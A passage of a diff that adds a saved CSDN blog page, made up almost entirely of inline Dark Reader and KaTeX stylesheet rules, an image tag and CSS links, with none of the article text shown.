--darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">88</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">89</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">90</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">91</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">92</li></ul></pre>
+      <p>
+        <img
+          src="https://i-blog.csdnimg.cn/direct/9ccd1e025c104e94b0e67f22c6c714d5.png"
+          alt="在这里插入图片描述"
+        />
+      </p>
+    </div>
+    <div><div></div></div>
+    <link
+      href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-f23dff6052.css"
+      rel="stylesheet"
+    /><style class="darkreader darkreader--cors" media="screen">
+      .markdown_views pre > code.hljs {
+        background-color: #f6f8fa;
+      }
+      .markdown_views .hljs {
+        display: block;
+        padding: 8px;
+      }
+      .markdown_views input[type="checkbox"]:checked {
+        position: relative;
+      }
+      .markdown_views input[type="checkbox"]:checked::after {
+        content: "";
+        position: absolute;
+        left: 2px;
+        top: 1px;
+        height: 6px;
+        width: 10px;
+        border-left: 1px solid #fff;
+        border-bottom: 1px solid #fff;
+        transform: rotate(-45deg);
+      }
+      .markdown_views input[type="checkbox"]:checked::before {
+        content: "";
+        position: absolute;
+        width: 13px;
+        height: 13px;
+        background: #1989fa;
+        border-radius: 2px;
+      }
+      .markdown_views .hljs-comment,
+      .markdown_views .hljs-comment *,
+      .markdown_views .hljs-javadoc,
+      .markdown_views .hljs-template_comment {
+        color: #800 !important;
+      }
+      .markdown_views .clojure .hljs-built_in,
+      .markdown_views .hljs-keyword,
+      .markdown_views .hljs-list .hljs-title,
+      .markdown_views .hljs-request,
+      .markdown_views .hljs-status,
+      .markdown_views .hljs-tag .hljs-title,
+      .markdown_views .hljs-winutils,
+      .markdown_views .http .hljs-title,
+      .markdown_views .method,
+      .markdown_views .nginx .hljs-title,
+      .markdown_views .setting .hljs-value,
+      .markdown_views .tex .hljs-command {
+        color: #008 !important;
+      }
+      .markdown_views .hljs-envvar {
+        color: #660 !important;
+      }
+      .markdown_views .hljs-attr_selector,
+      .markdown_views .hljs-cdata,
+      .markdown_views .hljs-date,
+      .markdown_views .hljs-filter .hljs-argument,
+      .markdown_views .hljs-regexp {
+        color: #080 !important;
+      }
+      .markdown_views .clojure .hljs-attribute,
+      .markdown_views .css .hljs-function,
+      .markdown_views .css .hljs-value .hljs-number,
+      .markdown_views .hljs-decorator,
+      .markdown_views .hljs-hexcolor,
+      .markdown_views .hljs-literal,
+      .markdown_views .hljs-number,
+      .markdown_views .hljs-pi,
+      .markdown_views .hljs-prompt,
+      .markdown_views .hljs-shebang,
+      .markdown_views .hljs-sub .hljs-identifier,
+      .markdown_views .hljs-symbol,
+      .markdown_views .hljs-tag,
+      .markdown_views .hljs-tag .hljs-keyword,
+      .markdown_views .ini .hljs-title {
+        color: #066 !important;
+      }
+      .markdown_views .clojure .hljs-title,
+      .markdown_views .haskell .hljs-type,
+      .markdown_views .hljs-built_in,
+      .markdown_views .hljs-class .hljs-id,
+      .markdown_views .hljs-class .hljs-title,
+      .markdown_views .hljs-doctype,
+      .markdown_views .hljs-javadoctag,
+      .markdown_views .hljs-params,
+      .markdown_views .hljs-phpdoc,
+      .markdown_views .hljs-tag .hljs-attribute,
+      .markdown_views .hljs-typename,
+      .markdown_views .hljs-variable,
+      .markdown_views .hljs-yardoctag,
+      .markdown_views .setting {
+        color: #4f4f4f !important;
+      }
+      .markdown_views .css .hljs-tag,
+      .markdown_views .hljs-pseudo,
+      .markdown_views .hljs-rules .hljs-property {
+        color: #000 !important;
+      }
+      .markdown_views .css .hljs-class,
+      .markdown_views .css .hljs-id {
+        color: #9b703f !important;
+      }
+      .markdown_views .hljs-value .hljs-important {
+        color: #f70 !important;
+        font-weight: 700;
+      }
+      .markdown_views .hljs-rules .hljs-keyword {
+        color: #c5af75 !important;
+      }
+      .markdown_views .apache .hljs-sqbracket,
+      .markdown_views .hljs-annotation,
+      .markdown_views .nginx .hljs-built_in {
+        color: #9b859d !important;
+      }
+      .markdown_views .tex .hljs-formula {
+        background-color: #eee !important;
+        font-style: italic;
+      }
+      .markdown_views .diff .hljs-header,
+      .markdown_views .hljs-chunk {
+        color: grey !important;
+        font-weight: 700;
+      }
+      .markdown_views .diff .hljs-change {
+        background-color: #bccff9 !important;
+      }
+      .markdown_views .hljs-addition {
+        background-color: #baeeba !important;
+      }
+      .markdown_views .hljs-deletion {
+        background-color: #ffc8bd !important;
+      }
+      .markdown_views .hljs-comment .hljs-yardoctag {
+        font-weight: 700;
+      }
+      .markdown_views .apache .hljs-cbracket,
+      .markdown_views .apache .hljs-tag,
+      .markdown_views .asciidoc .hljs-header,
+      .markdown_views .bash .hljs-variable,
+      .markdown_views .coffeescript .hljs-attribute,
+      .markdown_views .django .hljs-variable,
+      .markdown_views .erlang_repl .hljs-function_or_atom,
+      .markdown_views .haml .hljs-symbol,
+      .markdown_views .hljs-addition,
+      .markdown_views .hljs-aggregate,
+      .markdown_views .hljs-constant,
+      .markdown_views .hljs-flow,
+      .markdown_views .hljs-parent,
+      .markdown_views .hljs-pragma,
+      .markdown_views .hljs-preprocessor,
+      .markdown_views .hljs-preprocessor *,
+      .markdown_views .hljs-rules .hljs-value,
+      .markdown_views .hljs-rules .hljs-value .hljs-number,
+      .markdown_views .hljs-stream,
+      .markdown_views .hljs-string,
+      .markdown_views .hljs-tag .hljs-value,
+      .markdown_views .hljs-template_tag,
+      .markdown_views .hljs-title,
+      .markdown_views .markdown .hljs-header,
+      .markdown_views .ruby .hljs-symbol,
+      .markdown_views .ruby .hljs-symbol .hljs-string,
+      .markdown_views .smalltalk .hljs-class,
+      .markdown_views .tex .hljs-command,
+      .markdown_views .tex .hljs-special {
+        color: #090 !important;
+      }
+      .markdown_views .clojure .hljs-built_in,
+      .markdown_views .hljs,
+      .markdown_views .hljs-subst,
+      .markdown_views .hljs-tag .hljs-title,
+      .markdown_views .lisp .hljs-title,
+      .markdown_views .nginx .hljs-title {
+        color: #4f4f4f !important;
+      }
+      .markdown_views .apache .hljs-cbracket,
+      .markdown_views .apache .hljs-tag,
+      .markdown_views .asciidoc .hljs-header,
+      .markdown_views .bash .hljs-variable,
+      .markdown_views .coffeescript .hljs-attribute,
+      .markdown_views .django .hljs-variable,
+      .markdown_views .erlang_repl .hljs-function_or_atom,
+      .markdown_views .haml .hljs-symbol,
+      .markdown_views .hljs-addition,
+      .markdown_views .hljs-aggregate,
+      .markdown_views .hljs-constant,
+      .markdown_views .hljs-flow,
+      .markdown_views .hljs-parent,
+      .markdown_views .hljs-pragma,
+      .markdown_views .hljs-preprocessor,
+      .markdown_views .hljs-rules .hljs-value,
+      .markdown_views .hljs-rules .hljs-value .hljs-number,
+      .markdown_views .hljs-stream,
+      .markdown_views .hljs-string,
+      .markdown_views .hljs-tag .hljs-value,
+      .markdown_views .hljs-template_tag,
+      .markdown_views .hljs-title,
+      .markdown_views .markdown .hljs-header,
+      .markdown_views .ruby .hljs-symbol,
+      .markdown_views .ruby .hljs-symbol .hljs-string,
+      .markdown_views .smalltalk .hljs-class,
+      .markdown_views .tex .hljs-command,
+      .markdown_views .tex .hljs-special {
+        color: #090 !important;
+      }
+      .markdown_views code,
+      .markdown_views kbd,
+      .markdown_views pre,
+      .markdown_views samp {
+        font-family: Consolas, Inconsolata, Courier, monospace;
+        font-size: 14px;
+        line-height: 22px;
+        color: #000;
+      }
+      .markdown_views code {
+        color: #c7254e;
+        background-color: #f9f2f4;
+        border-radius: 2px;
+        padding: 4px 2px 0;
+      }
+      .markdown_views a {
+        color: #4ea1db;
+        text-decoration: none;
+      }
+      .markdown_views a:focus,
+      .markdown_views a:hover {
+        color: #ca0c16;
+      }
+      .markdown_views a:visited {
+        color: #6795b5;
+      }
+      .markdown_views .footnote {
+        vertical-align: top;
+        position: relative;
+        top: -4px;
+        font-size: 12px;
+      }
+      .markdown_views .footnotes ol li {
+        font-size: 14px;
+        line-height: 22px;
+        margin: 0 0 8px 24px;
+      }
+      .markdown_views .flow-chart,
+      .markdown_views .sequence-diagram {
+        text-align: center;
+        margin-bottom: 24px;
+        font-size: 14px !important;
+      }
+      .markdown_views .flow-chart [fill="#000"],
+      .markdown_views .flow-chart [fill="#000000"],
+      .markdown_views .flow-chart [fill="black"],
+      .markdown_views .sequence-diagram [fill="#000"],
+      .markdown_views .sequence-diagram [fill="#000000"],
+      .markdown_views .sequence-diagram [fill="black"] {
+        fill: #4f4f4f;
+      }
+      .markdown_views .flow-chart [stroke="#000000"],
+      .markdown_views .sequence-diagram [stroke="#000000"] {
+        stroke: #4f4f4f;
+      }
+      .markdown_views .MathJax_SVG_Display {
+        text-align: center;
+        margin: 24px 0;
+        font-size: 18px;
+        font-weight: 400;
+        color: #4f4f4f;
+        position: relative;
+        text-indent: 0;
+        max-width: none;
+        max-height: none;
+        min-width: 0;
+        min-height: 0;
+        width: 100%;
+      }
+      .markdown_views .toc {
+        font-size: 16px;
+        line-height: 24px;
+        margin: 0 0 24px;
+        padding: 0;
+      }
+      .markdown_views .toc ul {
+        margin: 0 0 8px;
+        padding: 0;
+      }
+      .markdown_views .toc ul li {
+        list-style-type: none;
+        margin: 8px 0 0 24px;
+      }
+      .markdown_views pre code {
+        display: block;
+        font-size: 14px;
+        line-height: 22px;
+        overflow-x: auto;
+        padding: 0 !important;
+        color: #000;
+        white-space: pre;
+        word-wrap: normal;
+        background-color: #f6f8fa;
+        border-radius: 4px;
+      }
+      .markdown_views pre code::-webkit-scrollbar {
+        height: 6px;
+        width: 138px;
+      }
+      .markdown_views pre code::-webkit-scrollbar-thumb {
+        background: #c2c2c2;
+        border-radius: 4px;
+      }
+      @media screen and (-webkit-min-device-pixel-ratio: 0) {
+        .markdown_views pre code {
+          min-width: 94%;
+        }
+      }
+      .markdown_views .prettyprint,
+      .markdown_views pre.prettyprint {
+        margin: 0 0 24px;
+        padding: 8px 16px 6px 56px;
+        background-color: #f6f8fa;
+        border: none;
+      }
+      #article_content .markdown_views pre.prettyprint * {
+        word-wrap: normal;
+        word-break: break-all;
+      }
+      .prettyprint {
+        position: relative;
+        overflow-y: hidden;
+        overflow-x: auto;
+      }
+      .markdown_views .prettyprint .pre-numbering {
+        position: absolute;
+        width: 48px;
+        background-color: #eef0f4;
+        top: 0;
+        left: 0;
+        margin: 0;
+        padding: 8px 0;
+        list-style: none;
+        text-align: right;
+      }
+      .markdown_views .pre-numbering li {
+        padding: 0 8px;
+        list-style: none;
+        margin: 0;
+      }
+      .markdown_views dl dd {
+        margin: 0 0 8px 40px;
+      }
+      .markdown_views kbd {
+        padding: 2px 8px;
+        border: 1px solid rgba(63, 63, 63, 0.25);
+        box-shadow: 0 1px 0 rgba(63, 63, 63, 0.25);
+        background-color: #fff;
+        color: #333;
+        border-radius: 4px;
+        display: inline-block;
+        margin: 0 2px;
+        white-space: nowrap;
+      }
+      .markdown_views.prism-atom-one-dark pre code {
+        background-color: #282c34;
+        color: #abb2bf;
+      }
+      .markdown_views.prism-atom-one-dark pre code.hljs * {
+        color: #abb2bf;
+      }
+      .markdown_views.prism-atom-one-dark .prettyprint,
+      .markdown_views.prism-atom-one-dark .prettyprint .pre-numbering,
+      .markdown_views.prism-atom-one-dark pre.prettyprint {
+        background-color: #282c34;
+      }
+      .markdown_views.prism-atom-one-dark .pre-numbering li {
+        color: #abb2bf !important;
+        border-right: 1px solid #c5c5c5;
+      }
+      .markdown_views.prism-atom-one-light .prettyprint,
+      .markdown_views.prism-atom-one-light .prettyprint .pre-numbering,
+      .markdown_views.prism-atom-one-light pre code,
+      .markdown_views.prism-atom-one-light pre.prettyprint {
+        background-color: #fafafa;
+      }
+      .markdown_views.prism-atom-one-light .pre-numbering li {
+        color: #383a42 !important;
+        border-right: 1px solid #c5c5c5;
+      }
+      .markdown_views.prism-tomorrow-night pre code {
+        background-color: #1d1f21;
+        color: #c5c8c6;
+      }
+      .markdown_views.prism-tomorrow-night pre code.hljs * {
+        color: #c5c8c6;
+      }
+      .markdown_views.prism-tomorrow-night .prettyprint,
+      .markdown_views.prism-tomorrow-night .prettyprint .pre-numbering,
+      .markdown_views.prism-tomorrow-night pre.prettyprint {
+        background-color: #1d1f21;
+      }
+      .markdown_views.prism-tomorrow-night .pre-numbering li {
+        color: #c5c8c6 !important;
+        border-right: 1px solid #c5c5c5;
+      }
+      .markdown_views.prism-dracula pre code {
+        background-color: #282a36;
+        color: #f8f8f2;
+      }
+      .markdown_views.prism-dracula pre code.hljs * {
+        color: #f8f8f2;
+      }
+      .markdown_views.prism-dracula .prettyprint,
+      .markdown_views.prism-dracula .prettyprint .pre-numbering,
+      .markdown_views.prism-dracula pre.prettyprint {
+        background-color: #282a36;
+      }
+      .markdown_views.prism-dracula .pre-numbering li {
+        color: #f8f8f2 !important;
+        border-right: 1px solid #c5c5c5;
+      }
+      .markdown_views.prism-github-gist .prettyprint,
+      .markdown_views.prism-github-gist .prettyprint .pre-numbering,
+      .markdown_views.prism-github-gist pre code,
+      .markdown_views.prism-github-gist pre.prettyprint {
+        background-color: #f3f4f5;
+      }
+      .markdown_views.prism-github-gist .pre-numbering li {
+        color: #5e6687 !important;
+        border-right: 1px solid #c5c5c5;
+      }
+      .markdown_views.prism-kimbie-light .prettyprint,
+      .markdown_views.prism-kimbie-light .prettyprint .pre-numbering,
+      .markdown_views.prism-kimbie-light pre code,
+      .markdown_views.prism-kimbie-light pre.prettyprint {
+        background-color: #fbebd4;
+      }
+      .markdown_views.prism-kimbie-light .pre-numbering li {
+        color: #84613d !important;
+        border-right: 1px solid #c5c5c5;
+      }
+      .markdown_views.prism-tomorrow-night-eighties pre code {
+        background-color: #2d2d2d;
+        color: #ccc;
+      }
+      .markdown_views.prism-tomorrow-night-eighties pre code.hljs * {
+        color: #ccc;
+      }
+      .markdown_views.prism-tomorrow-night-eighties .prettyprint,
+      .markdown_views.prism-tomorrow-night-eighties .prettyprint .pre-numbering,
+      .markdown_views.prism-tomorrow-night-eighties pre.prettyprint {
+        background-color: #2d2d2d;
+      }
+      .markdown_views.prism-tomorrow-night-eighties .pre-numbering li {
+        color: #ccc !important;
+        border-right: 1px solid #c5c5c5;
+      }
+      .markdown_views.prism-atelier-sulphurpool-light .prettyprint,
+      .markdown_views.prism-atelier-sulphurpool-light
+        .prettyprint
+        .pre-numbering,
+      .markdown_views.prism-atelier-sulphurpool-light pre code,
+      .markdown_views.prism-atelier-sulphurpool-light pre.prettyprint {
+        background-color: #f5f7ff;
+      }
+      .markdown_views.prism-atelier-sulphurpool-light .pre-numbering li {
+        color: #5e6687 !important;
+        border-right: 1px solid #c5c5c5;
+      }
+      .markdown_views .prism .token.comment {
+        font-family: "Source Code Pro", "DejaVu Sans Mono", "Ubuntu Mono",
+          "Anonymous Pro", "Droid Sans Mono", Menlo, Monaco, Consolas,
+          Inconsolata, Courier, "PingFang SC", "Microsoft YaHei", sans-serif !important;
+      }
+      .markdown_views .mermaid svg * {
+        font-family: "trebuchet ms", verdana, arial, sans-serif !important;
+      }
+      .markdown_views .mermaid {
+        overflow: hidden;
+        overflow-x: auto;
+      }
+      .markdown_views svg.mermaid-svg {
+        width: 100%;
+      }
+      .markdown_views .mermaid svg {
+        width: unset !important;
+        display: block;
+        margin: 0 auto;
+      }</style
+    ><style class="darkreader darkreader--sync" media="screen"></style>
+    <link
+      href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-c216769e99.css"
+      rel="stylesheet"
+    /><style class="darkreader darkreader--cors" media="screen">
+      .prism-atelier-sulphurpool-light .prism .namespace,
+      .prism-atom-one-dark .prism .namespace,
+      .prism-atom-one-light .prism .namespace,
+      .prism-dracula .prism .namespace,
+      .prism-github-gist .prism .namespace,
+      .prism-kimbie-light .prism .namespace,
+      .prism-tomorrow-night .prism .namespace,
+      .prism-tomorrow-night-eighties .prism .namespace,
+      .token.pre.gfm .namespace {
+        opacity: 0.7;
+      }
+      .app--dark .mermaid .loopLine,
+      .app--dark .mermaid .messageLine0,
+      .mermaid .loopLine,
+      .mermaid .messageLine0 {
+        marker-end: "url('https://csdnimg.cn/release/blogv2/dist/mdeditor/css/#arrowhead')";
+      }
+      .katex {
+        font:
+          400 1.21em KaTeX_Main,
+          Times New Roman,
+          serif;
+        line-height: 1.2;
+        text-indent: 0;
+        text-rendering: auto;
+      }
+      .katex .mathit,
+      .katex .textit {
+        font-style: italic;
+      }
+      .katex * {
+        -ms-high-contrast-adjust: none !important;
+        border-color: currentColor;
+      }
+      .katex .katex-version:after {
+        content: "0.16.4";
+      }
+      .katex .katex-mathml {
+        position: absolute;
+        clip: rect(1px, 1px, 1px, 1px);
+        padding: 0;
+        border: 0;
+        height: 1px;
+        width: 1px;
+        overflow: hidden;
+      }
+      .katex .katex-html > .newline {
+        display: block;
+      }
+      .katex .base {
+        position: relative;
+        white-space: nowrap;
+        width: min-content;
+      }
+      .katex .base,
+      .katex .strut {
+        display: inline-block;
+      }
+      .katex .textbf {
+        font-weight: 700;
+      }
+      .katex .textrm {
+        font-family: KaTeX_Main;
+      }
+      .katex .textsf {
+        font-family: KaTeX_SansSerif;
+      }
+      .katex .texttt {
+        font-family: KaTeX_Typewriter;
+      }
+      .katex .mathnormal {
+        font-family: KaTeX_Math;
+        font-style: italic;
+      }
+      .katex .mathit {
+        font-family: KaTeX_Main;
+      }
+      .katex .mathrm {
+        font-style: normal;
+      }
+      .katex .mathbf {
+        font-family: KaTeX_Main;
+        font-weight: 700;
+      }
+      .katex .boldsymbol {
+        font-family: KaTeX_Math;
+        font-weight: 700;
+        font-style: italic;
+      }
+      .katex .amsrm,
+      .katex .mathbb,
+      .katex .textbb {
+        font-family: KaTeX_AMS;
+      }
+      .katex .mathcal {
+        font-family: KaTeX_Caligraphic;
+      }
+      .katex .mathfrak,
+      .katex .textfrak {
+        font-family: KaTeX_Fraktur;
+      }
+      .katex .mathtt {
+        font-family: KaTeX_Typewriter;
+      }
+      .katex .mathscr,
+      .katex .textscr {
+        font-family: KaTeX_Script;
+      }
+      .katex .mathsf,
+      .katex .textsf {
+        font-family: KaTeX_SansSerif;
+      }
+      .katex .mathboldsf,
+      .katex .textboldsf {
+        font-family: KaTeX_SansSerif;
+        font-weight: 700;
+      }
+      .katex .mathitsf,
+      .katex .textitsf {
+        font-family: KaTeX_SansSerif;
+        font-style: italic;
+      }
+      .katex .mainrm {
+        font-family: KaTeX_Main;
+        font-style: normal;
+      }
+      .katex .vlist-t {
+        display: inline-table;
+        table-layout: fixed;
+        border-collapse: collapse;
+      }
+      .katex .vlist-r {
+        display: table-row;
+      }
+      .katex .vlist {
+        display: table-cell;
+        vertical-align: bottom;
+        position: relative;
+      }
+      .katex .vlist > span {
+        display: block;
+        height: 0;
+        position: relative;
+      }
+      .katex .vlist > span > span {
+        display: inline-block;
+      }
+      .katex .vlist > span > .pstrut {
+        overflow: hidden;
+        width: 0;
+      }
+      .katex .vlist-t2 {
+        margin-right: -2px;
+      }
+      .katex .vlist-s {
+        display: table-cell;
+        vertical-align: bottom;
+        font-size: 1px;
+        width: 2px;
+        min-width: 2px;
+      }
+      progress,
+      sub,
+      sup {
+        vertical-align: baseline;
+      }
+      .katex .vbox {
+        display: inline-flex;
+        flex-direction: column;
+        align-items: baseline;
+      }
+      .katex .hbox {
+        width: 100%;
+      }
+      .katex .hbox,
+      .katex .thinbox {
+        display: inline-flex;
+        flex-direction: row;
+      }
+      .katex .clap > .fix,
+      .katex .hdashline,
+      .katex .llap > .fix,
+      .katex .mfrac .frac-line,
+      .katex .mspace,
+      .katex .nulldelimiter,
+      .katex .rlap > .fix,
+      .katex .rule {
+        display: inline-block;
+      }
+      .katex .thinbox {
+        width: 0;
+        max-width: 0;
+      }
+      .katex .msupsub {
+        text-align: left;
+      }
+      .katex .accent > .vlist-t,
+      .katex .mfrac > span > span,
+      .katex .mtable .col-align-c > .vlist-t,
+      .katex .op-limits > .vlist-t {
+        text-align: center;
+      }
+      .katex .mfrac .frac-line {
+        width: 100%;
+        border-bottom-style: solid;
+      }
+      .katex .hdashline,
+      .katex .hline,
+      .katex .mfrac .frac-line,
+      .katex .overline .overline-line,
+      .katex .rule,
+      .katex .underline .underline-line {
+        min-height: 1px;
+      }
+      .katex .clap,
+      .katex .llap,
+      .katex .rlap {
+        width: 0;
+        position: relative;
+      }
+      .katex .clap > .inner,
+      .katex .llap > .inner,
+      .katex .rlap > .inner {
+        position: absolute;
+      }
+      .katex .accent .accent-body,
+      .katex .delimcenter,
+      .katex .op-symbol,
+      .katex .rule {
+        position: relative;
+      }
+      .katex .llap > .inner {
+        right: 0;
+      }
+      .katex .clap > .inner,
+      .katex .rlap > .inner {
+        left: 0;
+      }
+      .katex .clap > .inner > span {
+        margin-left: -50%;
+        margin-right: 50%;
+      }
+      .katex .rule {
+        border: 0 solid;
+      }
+      .katex .hline,
+      .katex .overline .overline-line,
+      .katex .underline .underline-line {
+        display: inline-block;
+        width: 100%;
+        border-bottom-style: solid;
+      }
+      .katex .hdashline {
+        width: 100%;
+        border-bottom-style: dashed;
+      }
+      .katex .sqrt > .root {
+        margin-left: 0.27777778em;
+        margin-right: -0.55555556em;
+      }
+      .katex .fontsize-ensurer.reset-size1.size1,
+      .katex .sizing.reset-size1.size1 {
+        font-size: 1em;
+      }
+      .katex .fontsize-ensurer.reset-size1.size2,
+      .katex .sizing.reset-size1.size2 {
+        font-size: 1.2em;
+      }
+      .katex .fontsize-ensurer.reset-size1.size3,
+      .katex .sizing.reset-size1.size3 {
+        font-size: 1.4em;
+      }
+      .katex .fontsize-ensurer.reset-size1.size4,
+      .katex .sizing.reset-size1.size4 {
+        font-size: 1.6em;
+      }
+      .katex .fontsize-ensurer.reset-size1.size5,
+      .katex .sizing.reset-size1.size5 {
+        font-size: 1.8em;
+      }
+      .katex .fontsize-ensurer.reset-size1.size6,
+      .katex .sizing.reset-size1.size6 {
+        font-size: 2em;
+      }
+      .katex .fontsize-ensurer.reset-size1.size7,
+      .katex .sizing.reset-size1.size7 {
+        font-size: 2.4em;
+      }
+      .katex .fontsize-ensurer.reset-size1.size8,
+      .katex .sizing.reset-size1.size8 {
+        font-size: 2.88em;
+      }
+      .katex .fontsize-ensurer.reset-size1.size9,
+      .katex .sizing.reset-size1.size9 {
+        font-size: 3.456em;
+      }
+      .katex .fontsize-ensurer.reset-size1.size10,
+      .katex .sizing.reset-size1.size10 {
+        font-size: 4.148em;
+      }
+      .katex .fontsize-ensurer.reset-size1.size11,
+      .katex .sizing.reset-size1.size11 {
+        font-size: 4.976em;
+      }
+      .katex .fontsize-ensurer.reset-size2.size1,
+      .katex .sizing.reset-size2.size1 {
+        font-size: 0.83333333em;
+      }
+      .katex .fontsize-ensurer.reset-size2.size2,
+      .katex .sizing.reset-size2.size2 {
+        font-size: 1em;
+      }
+      .katex .fontsize-ensurer.reset-size2.size3,
+      .katex .sizing.reset-size2.size3 {
+        font-size: 1.16666667em;
+      }
+      .katex .fontsize-ensurer.reset-size2.size4,
+      .katex .sizing.reset-size2.size4 {
+        font-size: 1.33333333em;
+      }
+      .katex .fontsize-ensurer.reset-size2.size5,
+      .katex .sizing.reset-size2.size5 {
+        font-size: 1.5em;
+      }
+      .katex .fontsize-ensurer.reset-size2.size6,
+      .katex .sizing.reset-size2.size6 {
+        font-size: 1.66666667em;
+      }
+      .katex .fontsize-ensurer.reset-size2.size7,
+      .katex .sizing.reset-size2.size7 {
+        font-size: 2em;
+      }
+      .katex .fontsize-ensurer.reset-size2.size8,
+      .katex .sizing.reset-size2.size8 {
+        font-size: 2.4em;
+      }
+      .katex .fontsize-ensurer.reset-size2.size9,
+      .katex .sizing.reset-size2.size9 {
+        font-size: 2.88em;
+      }
+      .katex .fontsize-ensurer.reset-size2.size10,
+      .katex .sizing.reset-size2.size10 {
+        font-size: 3.45666667em;
+      }
+      .katex .fontsize-ensurer.reset-size2.size11,
+      .katex .sizing.reset-size2.size11 {
+        font-size: 4.14666667em;
+      }
+      .katex .fontsize-ensurer.reset-size3.size1,
+      .katex .sizing.reset-size3.size1 {
+        font-size: 0.71428571em;
+      }
+      .katex .fontsize-ensurer.reset-size3.size2,
+      .katex .sizing.reset-size3.size2 {
+        font-size: 0.85714286em;
+      }
+      .katex .fontsize-ensurer.reset-size3.size3,
+      .katex .sizing.reset-size3.size3 {
+        font-size: 1em;
+      }
+      .katex .fontsize-ensurer.reset-size3.size4,
+      .katex .sizing.reset-size3.size4 {
+        font-size: 1.14285714em;
+      }
+      .katex .fontsize-ensurer.reset-size3.size5,
+      .katex .sizing.reset-size3.size5 {
+        font-size: 1.28571429em;
+      }
+      .katex .fontsize-ensurer.reset-size3.size6,
+      .katex .sizing.reset-size3.size6 {
+        font-size: 1.42857143em;
+      }
+      .katex .fontsize-ensurer.reset-size3.size7,
+      .katex .sizing.reset-size3.size7 {
+        font-size: 1.71428571em;
+      }
+      .katex .fontsize-ensurer.reset-size3.size8,
+      .katex .sizing.reset-size3.size8 {
+        font-size: 2.05714286em;
+      }
+      .katex .fontsize-ensurer.reset-size3.size9,
+      .katex .sizing.reset-size3.size9 {
+        font-size: 2.46857143em;
+      }
+      .katex .fontsize-ensurer.reset-size3.size10,
+      .katex .sizing.reset-size3.size10 {
+        font-size: 2.96285714em;
+      }
+      .katex .fontsize-ensurer.reset-size3.size11,
+      .katex .sizing.reset-size3.size11 {
+        font-size: 3.55428571em;
+      }
+      .katex .fontsize-ensurer.reset-size4.size1,
+      .katex .sizing.reset-size4.size1 {
+        font-size: 0.625em;
+      }
+      .katex .fontsize-ensurer.reset-size4.size2,
+      .katex .sizing.reset-size4.size2 {
+        font-size: 0.75em;
+      }
+      .katex .fontsize-ensurer.reset-size4.size3,
+      .katex .sizing.reset-size4.size3 {
+        font-size: 0.875em;
+      }
+      .katex .fontsize-ensurer.reset-size4.size4,
+      .katex .sizing.reset-size4.size4 {
+        font-size: 1em;
+      }
+      .katex .fontsize-ensurer.reset-size4.size5,
+      .katex .sizing.reset-size4.size5 {
+        font-size: 1.125em;
+      }
+      .katex .fontsize-ensurer.reset-size4.size6,
+      .katex .sizing.reset-size4.size6 {
+        font-size: 1.25em;
+      }
+      .katex .fontsize-ensurer.reset-size4.size7,
+      .katex .sizing.reset-size4.size7 {
+        font-size: 1.5em;
+      }
+      .katex .fontsize-ensurer.reset-size4.size8,
+      .katex .sizing.reset-size4.size8 {
+        font-size: 1.8em;
+      }
+      .katex .fontsize-ensurer.reset-size4.size9,
+      .katex .sizing.reset-size4.size9 {
+        font-size: 2.16em;
+      }
+      .katex .fontsize-ensurer.reset-size4.size10,
+      .katex .sizing.reset-size4.size10 {
+        font-size: 2.5925em;
+      }
+      .katex .fontsize-ensurer.reset-size4.size11,
+      .katex .sizing.reset-size4.size11 {
+        font-size: 3.11em;
+      }
+      .katex .fontsize-ensurer.reset-size5.size1,
+      .katex .sizing.reset-size5.size1 {
+        font-size: 0.55555556em;
+      }
+      .katex .fontsize-ensurer.reset-size5.size2,
+      .katex .sizing.reset-size5.size2 {
+        font-size: 0.66666667em;
+      }
+      .katex .fontsize-ensurer.reset-size5.size3,
+      .katex .sizing.reset-size5.size3 {
+        font-size: 0.77777778em;
+      }
+      .katex .fontsize-ensurer.reset-size5.size4,
+      .katex .sizing.reset-size5.size4 {
+        font-size: 0.88888889em;
+      }
+      .katex .fontsize-ensurer.reset-size5.size5,
+      .katex .sizing.reset-size5.size5 {
+        font-size: 1em;
+      }
+      .katex .fontsize-ensurer.reset-size5.size6,
+      .katex .sizing.reset-size5.size6 {
+        font-size: 1.11111111em;
+      }
+      .katex .fontsize-ensurer.reset-size5.size7,
+      .katex .sizing.reset-size5.size7 {
+        font-size: 1.33333333em;
+      }
+      .katex .fontsize-ensurer.reset-size5.size8,
+      .katex .sizing.reset-size5.size8 {
+        font-size: 1.6em;
+      }
+      .katex .fontsize-ensurer.reset-size5.size9,
+      .katex .sizing.reset-size5.size9 {
+        font-size: 1.92em;
+      }
+      .katex .fontsize-ensurer.reset-size5.size10,
+      .katex .sizing.reset-size5.size10 {
+        font-size: 2.30444444em;
+      }
+      .katex .fontsize-ensurer.reset-size5.size11,
+      .katex .sizing.reset-size5.size11 {
+        font-size: 2.76444444em;
+      }
+      .katex .fontsize-ensurer.reset-size6.size1,
+      .katex .sizing.reset-size6.size1 {
+        font-size: 0.5em;
+      }
+      .katex .fontsize-ensurer.reset-size6.size2,
+      .katex .sizing.reset-size6.size2 {
+        font-size: 0.6em;
+      }
+      .katex .fontsize-ensurer.reset-size6.size3,
+      .katex .sizing.reset-size6.size3 {
+        font-size: 0.7em;
+      }
+      .katex .fontsize-ensurer.reset-size6.size4,
+      .katex .sizing.reset-size6.size4 {
+        font-size: 0.8em;
+      }
+      .katex .fontsize-ensurer.reset-size6.size5,
+      .katex .sizing.reset-size6.size5 {
+        font-size: 0.9em;
+      }
+      .katex .fontsize-ensurer.reset-size6.size6,
+      .katex .sizing.reset-size6.size6 {
+        font-size: 1em;
+      }
+      .katex .fontsize-ensurer.reset-size6.size7,
+      .katex .sizing.reset-size6.size7 {
+        font-size: 1.2em;
+      }
+      .katex .fontsize-ensurer.reset-size6.size8,
+      .katex .sizing.reset-size6.size8 {
+        font-size: 1.44em;
+      }
+      .katex .fontsize-ensurer.reset-size6.size9,
+      .katex .sizing.reset-size6.size9 {
+        font-size: 1.728em;
+      }
+      .katex .fontsize-ensurer.reset-size6.size10,
+      .katex .sizing.reset-size6.size10 {
+        font-size: 2.074em;
+      }
+      .katex .fontsize-ensurer.reset-size6.size11,
